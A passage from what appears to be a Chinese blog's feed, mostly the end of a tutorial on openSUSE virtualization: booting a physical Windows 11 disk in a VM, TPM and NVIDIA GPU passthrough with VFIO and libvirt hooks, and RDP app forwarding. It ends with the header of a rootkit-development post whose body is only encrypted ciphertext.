class="hljs-keyword">if</span> [[ <span class="hljs-variable">$1</span> == <span class="hljs-variable">$VM_NAME</span> ]] &amp;&amp; [[ <span class="hljs-variable">$2</span> == <span class="hljs-string">&quot;prepare&quot;</span> || <span class="hljs-variable">$2</span> == <span class="hljs-string">&quot;stopped&quot;</span> ]] ; <span class="hljs-keyword">then</span><br>   <span class="hljs-keyword">if</span> [[ <span class="hljs-variable">$2</span> == <span class="hljs-string">&quot;prepare&quot;</span> ]] ; <span class="hljs-keyword">then</span><br>     <span class="hljs-comment"># startup logic here</span><br>     modprobe loop<br>     modprobe linear<br>     LOOP1=$(sudo losetup -f)<br>     losetup <span class="hljs-variable">$&#123;LOOP2&#125;</span>  /home/arttnba3/Desktop/VM/win11vm/disk/gpt<br>     LOOP2=$(sudo losetup -f)<br>     losetup <span class="hljs-variable">$&#123;LOOP2&#125;</span>  /home/arttnba3/Desktop/VM/win11vm/disk/efi1<br>     LOOP3=$(sudo losetup -f)<br>     losetup <span class="hljs-variable">$&#123;LOOP3&#125;</span>  /home/arttnba3/Desktop/VM/win11vm/disk/efi2<br>     mdadm --build --verbose /dev/md0 --chunk=512 --level=linear --raid-devices=6 /dev/loop0 /dev/loop1 /dev/nvme0n1p2 /dev/nvme0n1p3 /dev/nvme0n1p4 /dev/loop2<br>   <span class="hljs-keyword">else</span><br>     <span class="hljs-comment"># shutdown logic here</span><br>     <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Stopping array&quot;</span><br>     mdadm --stop /dev/md0<br>     <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;removing loopback devices&quot;</span><br>     losetup | grep -i <span class="hljs-string">&quot;win11vm&quot;</span> | awk <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span> | xargs sudo losetup -d<br>   <span class="hljs-keyword">fi</span><br><span class="hljs-keyword">fi</span><br></code></pre></td></tr></table></figure><h3 id="配置-TPM-直通"><a href="#配置-TPM-直通" class="headerlink" title="配置 TPM 直通"></a>配置 TPM 直通</h3><p><strong>可信平台模块</strong>（<a href="https://learn.microsoft.com/zh-cn/windows/security/hardware-security/tpm/trusted-platform-module-overview">Trusted Platform Module</a>）芯片是主板上的一块用来确保物理安全性的芯片，Windows 用其确保系统的物理安全性，包括 Pin 码等，自 Win 11 起 TPM 成为了操作系统启动的硬性要求</p><p>QEMU 虽然可以模拟 vTPM，但是与物理机 TPM 的非一致性会让系统在 Win 物理机与虚拟机间切换时造成一定的问题（在 Windows 看来这破坏了系统的完整性），由于在 Linux PC 上我们通常并不使用 TPM 特性，因此这里我们可以选择直接将 TPM 模块直通给虚拟机</p><p>TPM 模块的设备路径通常为 <code>/dev/tpm0</code> （v1.2）与 <code>/dev/tpmrm0</code> （v2.0），通常我们应当将前者进行直通才能达到完整直通的效果：</p><p><img src="https://s2.loli.net/2024/02/26/wnPzW97uJxqKXFI.png" alt="真是简简又单单，你们有没有这样的 virt-manager 啊">)</p><h1 id="0x02-在-Host-侧配置-RDP-连接"><a href="#0x02-在-Host-侧配置-RDP-连接" class="headerlink" title="0x02. 在 Host 侧配置 RDP 连接"></a>0x02. 在 Host 侧配置 RDP 连接</h1><h2 id="配置-RDP-硬体加速"><a href="#配置-RDP-硬体加速" class="headerlink" title="配置 RDP 硬体加速"></a>配置 RDP 硬体加速</h2><p>运行 <code>gpedit.msc</code> 找到 <code>*计算机配置-&gt;管理模板-&gt;Windows组件-&gt;远程桌面服务-&gt;远程桌面会话主机-&gt;远程会话环境</code>，在其中配置 RDP 硬体加速，以此获得更好的 RDP 性能：</p><p><img src="https://s2.loli.net/2024/02/26/ILEM9OrqKZFApou.png"></p><p>然后打开注册表编辑器路径 <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations</code> ，新建一个名为 <code>DWMFRAMEINTERVAL</code> 的 DWORD 值并设为 <code>15</code>：</p><p><img src="https://s2.loli.net/2024/02/26/gXABCzNwMH8KRYE.png"></p><p>重启即可</p><h2 id="配置-RDP-连接"><a href="#配置-RDP-连接" class="headerlink" title="配置 RDP 连接"></a>配置 RDP 连接</h2><blockquote><p>如果你的 RDP 连接没有声音，可以参见 <a href="https://www.anyviewer.cn/how-to/rdp-audio-not-working-6540.html">这个链接</a> 进行修复</p><p>如果无法连接上 Guest ，也可以检查一下是不是 Windows 防火墙的问题</p></blockquote><h3 id="使用-xfreerdp-仅运行单个应用"><a href="#使用-xfreerdp-仅运行单个应用" class="headerlink" title="使用 xfreerdp 仅运行单个应用"></a>使用 xfreerdp 仅运行单个应用</h3><p>首先安装上 freedrp：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo zypper <span class="hljs-keyword">in</span> freerdp</span><br></code></pre></td></tr></table></figure><p>接下来输入如下命令进行测试：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">xfreerdp /rfx /d:<span class="hljs-string">&quot;你的 VM 主机名&quot;</span> /u:<span class="hljs-string">&quot;你的 VM 用户名&quot;</span> /p:<span class="hljs-string">&quot;你的 VM 密码&quot;</span> /v:<span class="hljs-string">&quot;你的 VM 的 IP&quot;</span> +auto-reconnect +home-drive +clipboard /scale:100 /dynamic-resolution /audio-mode:0 /microphone /app:<span class="hljs-string">&quot;explorer.exe&quot;</span></span><br></code></pre></td></tr></table></figure><p>接下来就是见证奇迹的时刻——</p><p><img src="https://s2.loli.net/2024/02/22/GgCDkhwiznLF1fZ.png" alt="碉堡了好吗"></p><p>这里的 RDP 命令帮我们配置好了共享 <code>/home</code> 文件夹和剪贴板，所以你可以<strong>直接往 VM 里粘贴包括文件在内的东西</strong>，也可以在 VM 中访问 Host 侧的文件夹：）</p><blockquote></blockquote><h3 id="使用-sdl-freerdp"><a href="#使用-sdl-freerdp" class="headerlink" title="使用 sdl-freerdp"></a><em>使用 sdl-freerdp</em></h3><blockquote><p>和 wlfreerdp 一样，不支持仅转发单个应用（似乎是 wayland 缺失了某些特性）</p></blockquote><p>zypper 官方源里没有，可以手动添加，也可以像笔者一样通过 flatpak 进行安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">flatpak remote-add --if-not-exists flathub https://flathub.org/repo/flathub.flatpakrepo</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">flatpak install com.freerdp.FreeRDP</span><br></code></pre></td></tr></table></figure><p>然后运行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">flatpak run com.freerdp.FreeRDP /rfx /d:<span class="hljs-string">&quot;你的 VM 主机名&quot;</span> /u:<span class="hljs-string">&quot;你的 VM 用户名&quot;</span> /p:<span class="hljs-string">&quot;你的 VM 密码&quot;</span> /v:<span class="hljs-string">&quot;你的 VM 的 IP&quot;</span> +auto-reconnect +home-drive +clipboard /scale:100 /dynamic-resolution /audio-mode:0 /microphone</span><br></code></pre></td></tr></table></figure><h3 id="在应用列表中添加-Windows-程序图标"><a href="#在应用列表中添加-Windows-程序图标" class="headerlink" title="在应用列表中添加 Windows 程序图标"></a>在应用列表中添加 Windows 程序图标</h3><p>把自己想要运行的 Windows 程序路径写成 Desktop Entry 就行，后缀名改为 <code>.desktop</code> 并放在 <code>/usr/share/applicaitions/</code> 目录下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">[Desktop Entry]<br><span class="hljs-comment"># 该入口的类型</span><br>Type=Application<br><span class="hljs-comment"># 是否显示终端（可选）</span><br>Terminal=<span class="hljs-literal">false</span><br><span class="hljs-comment"># 点击该入口执行的命令</span><br>Exec=xfreerdp /rfx /d:<span class="hljs-string">&quot;你的 VM 主机名&quot;</span> /u:<span class="hljs-string">&quot;你的 VM 用户名&quot;</span> /p:<span class="hljs-string">&quot;你的 VM 密码&quot;</span> /v:<span class="hljs-string">&quot;你的 VM 的 IP&quot;</span> +auto-reconnect +home-drive +clipboard /scale:100 /dynamic-resolution /audio-mode:0 /microphone /app:<span class="hljs-string">&quot;VM 里的可执行程序路径名&quot;</span><br><span class="hljs-comment"># 该程序名称</span><br>Name=Name of Application<br><span class="hljs-comment"># 入口显示的图标路径（可选）</span><br>Icon=/path/to/icon<br></code></pre></td></tr></table></figure><h1 id="0x03-实现显卡直通-，这样就能玩👴最爱的-Genshin-Impact-了"><a href="#0x03-实现显卡直通-，这样就能玩👴最爱的-Genshin-Impact-了" class="headerlink" title="0x03. 实现显卡直通 ，这样就能玩👴最爱的 Genshin Impact 了"></a>0x03. 实现显卡直通 <del>，这样就能玩👴最爱的 <code>Genshin Impact</code> 了</del></h1><blockquote><p>参考 <a href="https://doc.opensuse.org/documentation/leap/virtualization/html/book-virtualization/app-gpu-passthru.html">SUSE - Configuring GPU Pass-Through for NVIDIA cards</a></p></blockquote><p>众所周知，《原神》是由米哈游自主研发的一款全新开放世界冒险游戏。游戏发生在一个被称作「提瓦特」的幻想世界，在这里，被神选中的人将被授予「神之眼」，导引元素之力。你将扮演一位名为「旅行者」的神秘角色，在自由的旅行中邂逅性格各异、能力独特的同伴们，和他们一起击败强敌，找回失散的亲人——同时，逐步发掘「原神」的真相。我现在每天玩原神都能赚150原石，每个月差不多5000原石的收入， 也就是现实生活中每个月5000美元的收入水平，换算过来最少也30000人民币，虽然我 只有14岁，但是已经超越了中国绝大多数人(包括你)的水平，这便是原神给我的骄傲的资本…</p><p><img src="https://s2.loli.net/2024/02/22/kNXAmoqZslUjEYb.png" alt="差不多得了😅屁大点事都要拐上原神，原神一没招你惹你，二没干伤天害理的事情，到底怎么你了让你一直无脑抹黑，米哈游每天费尽心思的文化输出弘扬中国文化，你这种喷子只会在网上敲键盘诋毁良心公司，中国游戏的未来就是被你这种人毁掉的😅 作者：我永远单推Cierra https://www.bilibili.com/read/cv17996308/ 出处：bilibili"></p><p><del>扯得有些远了，</del> 总而言之有的时候我们想要在 Windows 上进行一些需要用显卡才能完成的任务，亦或是使用显卡进行图形加速等，virt-manager 默认提供的 RedHat QXL 终究只是一个由 QEMU 进行模拟的设备，性能上自然很难与真正的显卡相比拟</p><p>而笔者的笔记本刚好有两个显卡：一个是 Intel 的核显，另一个是一张 NVIDIA 的卡，因为笔者日常也不用这台电脑炼丹（ <del>再说了就一张小破 4060 能练个啥玩意出来</del> ），因此笔者决定将 N 卡直通到 VM 当中以提高 VM 的图形化性能， <del>同时闲暇之余还能打开 VM 玩玩游戏这样子</del></p><h2 id="配置-IOMMU"><a href="#配置-IOMMU" class="headerlink" title="配置 IOMMU"></a>配置 IOMMU</h2><p>在 <a href="https://arttnba3.cn/2022/08/29/VURTUALIZATION-0X02-BASIC_KNOWLEDGE/">《系统虚拟化导论》</a> 中我们知道集成在北桥上的 IOMMU 可以通过 DMA 重映射与中断重映射的方式让我们实现 I&#x2F;O 虚拟化：</p><p><img src="https://s2.loli.net/2022/09/03/k8mOSalVRWtseMi.png"></p><p>IOMMU 默认是关闭的，因此首先我们要先启用 IOMMU 这一功能，首先检查一下你是否有两张卡以及是否在 UEFI 里开启了虚拟化相关特性：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">dmesg | grep -e <span class="hljs-string">&quot;Directed I/O&quot;</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">lspci | grep -i <span class="hljs-string">&quot;vga&quot;</span></span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/02/22/SKYOdgF1s9U2Za4.png" alt="image.png"></p><blockquote><p>如果你只有一张显示卡的话，<strong>那笔者不推荐弄显卡直通</strong>，因为同一时间只有一个系统能够占用显卡，Guest 拿掉之后 Host 肯定是没有图形输出的，Guest 关机后才能回到 Host 图形界面，<strong>这种直通还不如直接装双系统后重启回 Windows</strong></p></blockquote><p>在 <code>/etc/default/grub</code> 的 <code>GRUB_CMDLINE_LINUX_DEFAULT</code> 参数中添加 <code>intel_iommu=on iommu=pt rd.driver.pre=vfio-pci</code> （AMD CPU 则添加 <code>iommu=pt amd_iommu=on rd.driver.pre=vfio-pci</code>），之后通过如下命令更新 grub：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo grub2-mkconfig -o /boot/grub2/grub.cfg</span> <br></code></pre></td></tr></table></figure><p>重启后通过 <code>dmesg |  grep -e DMAR -e IOMMU</code> 命令我们便能看到 IOMMU 已经开启：</p><p><img src="https://s2.loli.net/2024/02/22/kDgealrxURMKE6d.png" alt="image.png"></p><p>接下来我们运行 <code>lspci -nn | grep -i nvidia</code> 命令找到 N 卡后面的设备 id,记录下这串数字：</p><p><img src="https://s2.loli.net/2024/02/22/fNKQEu2z8VSoHOv.png" alt="image.png"></p><h2 id="实现显卡动态直通"><a href="#实现显卡动态直通" class="headerlink" title="实现显卡动态直通"></a>实现显卡动态直通</h2><p>大部分双显卡直通的教程上来就是让把老 N 卡的 nouveau 驱动给卸了，但是笔者<a href="https://arttnba3.cn/2023/11/24/DISTRO-0X01-INSTALL_TUMBLEWEED_WINDOWS/">一开始就装了 N 卡闭源驱动</a>，现在再给卸了有点不太现实，而且万一以后有空了也想用这台电脑小练点丹也说不定，所以这里笔者选择配置<strong>动态显卡重装载策略</strong>——</p><ul><li>默认卸载 N 卡驱动，在需要时再装载 N 卡驱动</li><li>在 VM 启动时卸载 N 卡驱动，在 VM 结束运行后再重新装载，<strong>桌面环境则仅在核显上运行</strong>（其实 Linux 桌面环境通常情况下用核显的性能基本上都是足够的）</li></ul><h3 id="配置-VFIO"><a href="#配置-VFIO" class="headerlink" title="配置 VFIO"></a>配置 VFIO</h3><p>首先配置 VFIO，这里我们要防止 nvidia 驱动在开机时便被装载（后面用到再手动装载，否则会比较麻烦），首先在 <code>/etc/modprobe.d/</code> 中创建文件 <code>vfio.conf</code> 并写入我们刚刚获取到的标识符：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">options</span> vfio-pci ids=<span class="hljs-number">10</span>de:<span class="hljs-number">28</span>a0<br></code></pre></td></tr></table></figure><p>然后创建文件 <code>/etc/dracut.conf.d/gpu-passthrough.conf</code> 以装载 <a href="https://documentation.suse.com/zh-cn/sles/15-SP3/html/SLES-all/gloss-vt-glossary.html#gloss-vt-acronym-vfio">VFIO</a> 驱动：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs makefile">add_drivers+=<span class="hljs-string">&quot;vfio vfio_iommu_type1 vfio_pci vfio_virqfd&quot;</span><br></code></pre></td></tr></table></figure><p>接下来使用 dracut 重新生成 initrd：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo dracut --force /boot/initrd $(uname -r)<br></code></pre></td></tr></table></figure><p>然后为 Guest VM 禁用 MSR（防止崩溃），创建 <code>/etc/modprobe.d/kvm.conf</code> 文件并写入：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">options</span> kvm ignore_msrs=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>重启电脑后你就会发现 N 卡驱动载入失败，因为此时 VFIO 先一步取得了N 卡的所有权：）</p><p><img src="https://s2.loli.net/2024/02/25/xZzI4O9J5niXDqf.png"></p><p>如果你想再用上 N 卡闭源驱动搞事情，可以通过如下脚本装载回 N 卡驱动，这里我们用 <code>virsh</code> 来重新装载设备，注意查看 N 卡对应的 pci 号设备：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br>sudo modprobe -r vfio-pci<br>virsh nodedev-reattach pci_0000_01_00_0<br>sudo modprobe nvidia<br>sudo modprobe nvidia_modeset<br>sudo modprobe nvidia_uvm<br>sudo modprobe nvidia_drm<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/02/25/sfDjCAB149aK5Ye.png"></p><p>重新用回 VFIO 的话就是反着来的脚本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br>sudo modprobe -r nvidia_drm<br>sudo modprobe -r nvidia_uvm<br>sudo modprobe -r nvidia_modeset<br>sudo modprobe -r nvidia<br>virsh nodedev-detach pci_0000_01_00_0<br>sudo modprobe vfio-pci<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/02/25/PDVGtKZJ3TSujkF.png"></p><h3 id="配置显卡直通"><a href="#配置显卡直通" class="headerlink" title="配置显卡直通"></a>配置显卡直通</h3><p>接下来我们将这张卡通进 VM 中，首先用如下脚本查看显卡所在 IOMMU 组都有哪些设备：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-built_in">shopt</span> -s nullglob<br><span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> /sys/kernel/iommu_groups/*/devices/*; <span class="hljs-keyword">do</span> <br>    n=<span class="hljs-variable">$&#123;d#*/iommu_groups/*&#125;</span>; n=<span class="hljs-variable">$&#123;n%%/*&#125;</span><br>    <span class="hljs-built_in">printf</span> <span class="hljs-string">&#x27;IOMMU Group %s &#x27;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$n</span>&quot;</span><br>    lspci -nns <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;d##*/&#125;</span>&quot;</span><br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/02/25/uWZP85BcjrdQs7x.png" alt="比较幸运的是笔者的 N 卡所在组只有一个设备"></p><p>接下来在 virt-manager 中添加 <code>PCI Host Device</code> 选<strong>显卡所在的整个 IOMMU group 设备</strong>即可：</p><p><img src="https://s2.loli.net/2024/02/25/AKMU9xRwONFc4jC.png" alt="小学生都会做"></p><blockquote><p>启动前注意把 Video 换成 <code>virtio</code> 而非 <code>QXL</code> ，否则在 SPICE 服务启动后鼠标没法正常工作：(</p></blockquote><p>之后就完成直通了：</p><p><img src="https://s2.loli.net/2024/02/26/9Ycy386z1DJwiWB.png"></p><p><img src="https://s2.loli.net/2024/02/25/LVaHAEvjuQZhdqy.png"></p><p>如果你和笔者一样电脑自带的视频输出口都走独显，则可以通过外接显示器直接输出虚拟机内容，这样就不需要忍受 virtio 那极其底下的性能了：</p><p><img src="https://s2.loli.net/2024/02/28/5mcCALesxZbzUfq.jpg"></p><h3 id="配置-libvirt-hook-动态装载显卡"><a href="#配置-libvirt-hook-动态装载显卡" class="headerlink" title="配置 libvirt hook 动态装载显卡"></a>配置 libvirt hook 动态装载显卡</h3><p>我们只需要将前面的两个脚本写到  <code>/etc/libvirt/hooks/qemu</code> 脚本中即可：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><br>VM_NAME=<span class="hljs-string">&quot;Windows11PhysVM&quot;</span><br><br><span class="hljs-keyword">if</span> [[ <span class="hljs-variable">$1</span> == <span class="hljs-variable">$VM_NAME</span> ]] &amp;&amp; [[ <span class="hljs-variable">$2</span> == <span class="hljs-string">&quot;prepare&quot;</span> || <span class="hljs-variable">$2</span> == <span class="hljs-string">&quot;stopped&quot;</span> ]] ; <span class="hljs-keyword">then</span><br>   <span class="hljs-keyword">if</span> [[ <span class="hljs-variable">$2</span> == <span class="hljs-string">&quot;prepare&quot;</span> ]] ; <span class="hljs-keyword">then</span><br>     sudo modprobe -r nvidia_drm<br>     sudo modprobe -r nvidia_uvm<br>     sudo modprobe -r nvidia_modeset<br>     sudo modprobe -r nvidia<br>     virsh nodedev-detach pci_0000_01_00_0<br>     sudo modprobe vfio-pci<br>   <span class="hljs-keyword">else</span><br>     sudo modprobe -r vfio-pci<br>     virsh nodedev-reattach pci_0000_01_00_0<br>     sudo modprobe nvidia<br>     sudo modprobe nvidia_modeset<br>     sudo modprobe nvidia_uvm<br>     sudo modprobe nvidia_drm<br>   <span class="hljs-keyword">fi</span><br><span class="hljs-keyword">fi</span><br></code></pre></td></tr></table></figure><h3 id="在虚拟机里玩原神-（To-do）"><a href="#在虚拟机里玩原神-（To-do）" class="headerlink" title="在虚拟机里玩原神 （To do）"></a><em><del>在虚拟机里玩原神</del></em> （To do）</h3><p><del>最后自然就是大家最喜欢的，原神，启动——</del> 家人们大事不妙了，👴发现原神有 VM 检测， <del>今天玩不了了，咱们下回再见吧</del></p><p><img src="https://s2.loli.net/2024/02/28/JcLyUmIOVAjeYv2.png"></p><h1 id="0x04-一些亟待解决的小问题"><a href="#0x04-一些亟待解决的小问题" class="headerlink" title="0x04. 一些亟待解决的小问题"></a>0x04. 一些亟待解决的小问题</h1><h2 id="虚拟化组件问题汇总"><a href="#虚拟化组件问题汇总" class="headerlink" title="虚拟化组件问题汇总"></a>虚拟化组件问题汇总</h2><h3 id="1-libvirtd-不会自启动"><a href="#1-libvirtd-不会自启动" class="headerlink" title="1. libvirtd 不会自启动"></a>1. libvirtd 不会自启动</h3><p>似乎是因为 libvirtd 被拆成了数个小组件，所以不管怎么 <code>enable</code> 都没法让他自启动，但是 libvirtd 不启动的话 virtiofsd 也没法正常工作，因此暂时还需要每次启动后都得手动 <code>systemctl start libvirtd.service</code></p><h2 id="xfreerdp-问题综合汇总"><a href="#xfreerdp-问题综合汇总" class="headerlink" title="xfreerdp 问题综合汇总"></a>xfreerdp 问题综合汇总</h2><h3 id="1-存在画面撕裂"><a href="#1-存在画面撕裂" class="headerlink" title="1. 存在画面撕裂"></a>1. 存在画面撕裂</h3><p>尤其是在仅转发单个应用而非整个桌面时</p><h3 id="2-新开单应用转发导致所有窗口重新开启"><a href="#2-新开单应用转发导致所有窗口重新开启" class="headerlink" title="2. 新开单应用转发导致所有窗口重新开启"></a>2. 新开单应用转发导致所有窗口重新开启</h3><p>其实桌面都在同一个 session 里，但是 xfreerdp 需要重新建一遍窗口，感觉是设计上的缺陷 ：(</p><h3 id="3-app-参数纯后台应用无法保持窗口留存"><a href="#3-app-参数纯后台应用无法保持窗口留存" class="headerlink" title="3. /app 参数纯后台应用无法保持窗口留存"></a>3. <code>/app</code> 参数纯后台应用无法保持窗口留存</h3><p>开个酷狗&#x2F;网易云之类的窗口一关 RDP 连接就也没了，感觉还是设计上的缺陷 ：(</p><h2 id="不能玩-👴-最爱的-Genshin-Impact"><a href="#不能玩-👴-最爱的-Genshin-Impact" class="headerlink" title="不能玩 👴 最爱的 Genshin Impact"></a><del>不能玩 👴 最爱的 Genshin Impact</del></h2><p>原神似乎用了比较严苛的虚拟化检查方案，所以这个后日再议了（笑）</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;4202 年了，Linux Desktop 还会好吗？&lt;/p&gt;</summary>
    
    
    
    <category term="SUSE" scheme="https://arttnba3.github.io/categories/SUSE/"/>
    
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="虚拟化" scheme="https://arttnba3.github.io/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"/>
    
    <category term="openSUSE" scheme="https://arttnba3.github.io/tags/openSUSE/"/>
    
    <category term="openSUSE Tumbleweed" scheme="https://arttnba3.github.io/tags/openSUSE-Tumbleweed/"/>
    
  </entry>
  
  <entry>
    <title>【VIRUS.0x00】现代 Linux rootkit 开发导论</title>
    <link href="https://arttnba3.github.io/2024/01/01/VIRUS-0X00-LINUX_ROOTKIT/"/>
    <id>https://arttnba3.github.io/2024/01/01/VIRUS-0X00-LINUX_ROOTKIT/</id>
    <published>2023-12-31T17:21:32.000Z</published>
    <updated>2024-02-27T17:45:32.575Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="没写完，别急，急的话可以先看先知上的半成品" data-whm="还请不要做一些奇奇怪怪的事情！">  <script id="hbeData" type="hbeData" data-hmacdigest="6d77a1c0d66864a106c2d3e8ae725aa01f24cf133f3652b304956cdb6b7d2c09">f677d6c1615e5477f274160d582541c6499bc27281a4a6519cf8aefc368b1bfd6eaec1f1c40964741832d122823bb60514e575bb9de401f52bbf7b14d4745275e747a01f6f72c040d32e2fd5b4ee724507639c5812c4b7c84482f72bcab9a8de00f3a5cefe8bd5867ff308da969ad685234484c18067cb5ed47e6bdb6296ee6b417f61264ecad82e77220b54b7f6aff461fd1e4cd5165d385c0c7665504722fc5e984e72e737f113a4cbd6c06c9d77363230d30071a9ec960cccee7923c53073944fa1dd2d2ab1d909b31168735014a10e1e7abc173a0f271ce199a56cd3b82263d79d6272650ad660676efa3fc84acbafbc341925331d258833b8933591bbaad24c56d7459dd5d28196125a24b069588f85d3d8b362857afd54c2b457a4a28dca468dcb65b9b15a2dbb5f71cc7b40b6743fbb4c6efa421f18b940c0a8f62dc564452b932abef43979e9d390c05a7848ccca0d7349b639ebd444b08819554fc7f7bcdf3b806b13d15d7ec84c3376e6ecc75837badd15f923d73f4b3d163f403500683cf7a55721f41231c969a8207fe9e2afdb8a736a26bc73b1fc69669403f3427eb19300f85f80ee4d628d361141f2e38383662c2ef905254b033f6fbc11b0ce89e80046423da409bc80b6823aee30b620833572ced4ce82be53ccc33135af423521a4699713411b743a230ce78c00440e6b896af71809d6b530dcf55277b33d31c6a494c2e050d93214db7a90e026f03d412c419a6034b795895916a98af7d6738a0c86e7eb07e47267b10bf7a179980a38b9e9031556e0d7719b75215dbba33f5708e0e49f709c4e97b32b2534dab4f4031120d37a6e7b8b27b362cde2824db65402cd3c2f2d00fd33d08be218f020566de74ed7f561b6cf4b70849d3ca3437e2a94db67a0816ed7db4018792bc8a2c3eef4c3ca59de4048c6fb7f5dd312395ca45c3cb616d180f0a39fabd3076b6f7ba300438c6243a062a47dacf293371222c6aa449ccfcc75aba601200fc8605d7521f9cd3227954ba673ab09048ca677f5d55e2caab73a808d97f921ea48cc6f2a15206204c2fa08c69d9e07724dd1f083d2da3f33d5a44af0a69543cacca41bb41e541bdd49bdd371ce54167522650e3194651d4c2a7b30a91edd193e1171d7a8e742758120004aad0b11904f3777f15b157ca1d5d018a9ac63df12ad54abe9615d43a6c49c469094dc626488cf4d02406553dfbe7f473dcc07d86907d87546b83bf177155c063962292a9629b0149b3977c488a22a829daa7b2d6baf0601fce7ad2f1ef6ae478b8e56d6baf92837e309b0a61861b3b278bd89760139a2e089410dbfe80e1a3d6ec8d8e83852f21d57ce6f2b7744bccaa2aabc4fa53181715eff6231bf6e1c219d1ceb0679c7cb580a56e4d6bf18e6b5f44e0b3989952ca5620a41f34cfe5db4390596d6b6ba1c15648bf53579cd1fe4cdc96540ce0239e27bc72ae7a94db8a9fb025e3e2bd7ba2d6676797b93f21a2376372a8f50853e645d4977eed5b139ff36aa369fdb1bffce6a8d05f4bfaa44b9c3f07bc6ea8b28dca24866fd101ca7b1898513bd9d1daa2fe08b5e98530279a342a578ad271dc5d66c5569dc5c0e0d48dc8682bf80bf9f30dbd2bcce2c345129c800cd7e2053f8947d5d1f0a3a4b2df059b85bd81d40b0c184fc38d53e9740a1d500c6a86b94fe57018fb481e8aa9a7872e9e94be55d0ca15f166e93cd2ff28082042294698ebd7bdefd41cc33a8407d51503a0f9d749a9e0a8721f822defc7f2d36bed82b2381f666a1e58a2bd12ec5b769457741741e3c44accaabed3df938b4cddbe0db18d9a5ab98a20091926f39c2666fda427aafa1a5328b031801efcf1643a3c11b483cbaf105ad92dc02bdb9be42fcff80481bc8001e6871868bf7442cbf9a62a772aec0cecfc550691fc3396ef6da2d3cc7de291976c83e8d71c43f8bb9ade363d7986fd8dab60d94f9c984a75e900dc2dbcbd61a88a5a0c5ab7d337675b5626fbb9ffb152575763761bad4a343966728465cdd744386b82fefcf54ead29aee126d49e6bf4b68740a1b1f2a217eb0fe139984abc86a5238b8b9093